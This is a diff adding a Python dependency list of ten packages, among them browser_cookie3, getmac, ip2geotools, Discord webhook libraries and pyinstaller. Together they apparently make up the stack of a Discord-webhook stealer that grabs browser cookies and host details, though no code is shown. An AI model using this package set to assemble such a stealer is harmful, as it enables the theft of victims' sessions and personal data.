@@ -1,0 +1,10 @@
+discord
+discordwebhook
+getmac
+ip2geotools
+psutil
+dhooks
+requests
+pillow
+browser_cookie3
+pyinstaller
